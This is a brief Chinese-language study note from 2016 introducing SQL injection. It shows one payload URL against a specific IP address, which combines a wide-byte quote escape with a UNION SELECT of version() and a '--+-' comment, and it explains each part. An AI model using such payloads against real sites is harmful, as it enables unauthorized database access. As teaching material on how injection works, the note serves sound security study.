# SQL注入---初步认识

```r
http://115.28.150.176/sqli/index.php
?id=2%df%27 and 1=2 union select 2,version() --+-

解释：前面是宽字节注入，详情见宽字节注入笔记，
         and 1=2 使判断错误，以使其只执行之后的语句， 
        version()  一个sql的函数，可以用来查sql数据库的版本
         --+-  注释符  ，注释符只要两个横杠就够了，+被译成空格，这样写是sql的风格，确保注释起作用（注释符后须有一个空格）
关于sql的函数，请移步：http://c.biancheng.net/cpp/html/1448.html
```


2016/5/30  
